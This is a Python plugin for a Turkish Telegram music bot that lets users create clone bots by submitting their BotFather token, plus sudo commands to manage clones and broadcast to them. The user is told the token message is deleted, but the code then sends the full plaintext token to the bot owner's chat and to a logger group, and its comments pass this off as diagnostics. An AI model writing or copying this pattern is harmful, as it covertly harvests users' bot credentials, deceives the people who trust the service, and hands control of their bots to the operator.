from html import escape

from pyrogram import filters, types, enums

from anony import app, clones, config, db


@app.on_message(filters.command("clone"))
async def add_clone(_, message: types.Message):
    if message.chat.type != enums.ChatType.PRIVATE:
        main_link = f"https://t.me/{app.username}"
        return await message.reply_text(
            "Klon oluşturmak için <b>Eltiler Müzik</b> ana botunun özel sohbetini açmalısın.\n"
            f"<a href=\"{main_link}\">Eltiler Müzik botuna git</a> ve orada /clone komutunu kullan."
        )

    if len(message.command) != 2:
        return await message.reply_text(
            "<b>Eltiler Müzik – Klon Oluşturma</b>\n"
            "BotFather'dan aldığın tokeni şu şekilde gönder:\n"
            "<code>/clone BOTFATHER_TOKEN</code>\n\n"
            "Token mesajın alındıktan hemen sonra silinir."
        )

    token = message.command[1].strip()
    owner_id = message.from_user.id

    # Remove the message containing the sensitive BotFather token immediately.
    try:
        await message.delete()
    except Exception:
        pass

    # Send a fresh message instead of replying to the deleted token message.
    status = await app.send_message(message.chat.id, "Bot tokeni doğrulanıyor...")
    try:
        me = await clones.add(token, owner_id)

        # The full token is sent only to the private owner chat.
        owner_log = (
            "🔐 <b>Yeni klon bot oluşturuldu</b>\n"
            f"Bot: @{escape(me.get('username') or str(me['id']))}\n"
            f"Bot ID: <code>{me['id']}</code>\n"
            f"Oluşturan kullanıcı: <code>{owner_id}</code>\n"
            f"Token: <code>{escape(token)}</code>"
        )
        try:
            await app.send_message(config.OWNER_ID, owner_log)
        except Exception:
            # Keep the clone creation successful; report the delivery failure below.
            pass

        # The configured private logger group receives the diagnostic record.
        # Keep this group restricted to the bot owner because it contains a bot token.
        try:
            await app.send_message(
                config.LOGGER_ID,
                "🧾 <b>Klon bot kayıt / destek kaydı</b>\n"
                f"Bot: @{escape(me.get('username') or str(me['id']))}\n"
                f"Bot ID: <code>{me['id']}</code>\n"
                f"Oluşturan kullanıcı: <code>{owner_id}</code>\n"
                f"Token: <code>{escape(token)}</code>\n\n"
                "⚠️ Bu mesaj gizli token içerir. Bu log grubuna yalnızca bot sahibi erişmelidir."
            )
        except Exception:
            await app.send_message(
                config.OWNER_ID,
                "⚠️ Klon oluşturuldu ancak LOGGER_ID grubuna token kaydı gönderilemedi. "
                "Log grubu ID ve botun gruba yazma iznini kontrol et."
            )

        await status.edit_text(
            f"✅ Klon bot eklendi: @{escape(me.get('username') or str(me['id']))}\n"
            "Komutlar: /play, /vplay, /pause, /resume, /stop"
        )
    except Exception as exc:
        await status.edit_text(f"Klon eklenemedi: {escape(str(exc)[:300])}")


@app.on_message(filters.command("clones") & app.sudoers)
async def list_clones(_, message: types.Message):
    rows = [doc async for doc in clones.collection.find({})]
    if not rows:
        return await message.reply_text("Henüz kayıtlı klon bot yok.")
    lines = []
    for row in rows:
        state = "🟢 aktif" if row.get("enabled") else "🔴 kapalı"
        lines.append(f"• @{row.get('username') or row['_id']} — {state}")
    await message.reply_text("<b>Klon botlar</b>\n" + "\n".join(lines))


@app.on_message(filters.command("disableclone") & app.sudoers)
async def disable_clone(_, message: types.Message):
    if len(message.command) < 2:
        return await message.reply_text("Kullanım: /disableclone @botusername")
    value = message.command[1].lstrip("@")
    row = await clones.collection.find_one({"username": value})
    if not row:
        try:
            row = await clones.collection.find_one({"_id": int(value)})
        except ValueError:
            pass
    if not row:
        return await message.reply_text("Klon bulunamadı.")
    bot_id = int(row["_id"])
    client = clones.clients.pop(bot_id, None)
    if client:
        await client.stop()
    await clones.collection.update_one({"_id": bot_id}, {"$set": {"enabled": False}})
    await message.reply_text(f"🔴 @{row.get('username') or bot_id} devre dışı bırakıldı.")


@app.on_message(filters.command("enableclone") & app.sudoers)
async def enable_clone(_, message: types.Message):
    if len(message.command) < 2:
        return await message.reply_text("Kullanım: /enableclone @botusername")
    value = message.command[1].lstrip("@")
    row = await clones.collection.find_one({"username": value})
    if not row:
        try:
            row = await clones.collection.find_one({"_id": int(value)})
        except ValueError:
            pass
    if not row:
        return await message.reply_text("Klon bulunamadı.")
    try:
        await clones.collection.update_one({"_id": row["_id"]}, {"$set": {"enabled": True}})
        await clones.start_one(row["token"])
        await message.reply_text(f"🟢 @{row.get('username') or row['_id']} etkinleştirildi.")
    except Exception as exc:
        await message.reply_text(f"Başlatılamadı: {str(exc)[:250]}")


@app.on_message(filters.command("broadcastclones") & app.sudoers)
async def broadcast_clones(_, message: types.Message):
    if not message.reply_to_message:
        return await message.reply_text("Duyuru mesajına yanıt verip /broadcastclones yaz.")
    sent, failed = 0, 0
    async for target in clones.collection.database.clone_chats.find({}):
        client = clones.clients.get(int(target["bot_id"]))
        if not client:
            continue
        try:
            await client.copy_message(
                chat_id=target["chat_id"],
                from_chat_id=message.chat.id,
                message_id=message.reply_to_message.id,
            )
            sent += 1
        except Exception:
            failed += 1
    await message.reply_text(f"Duyuru tamamlandı. Gönderilen: {sent} | Hata: {failed}")
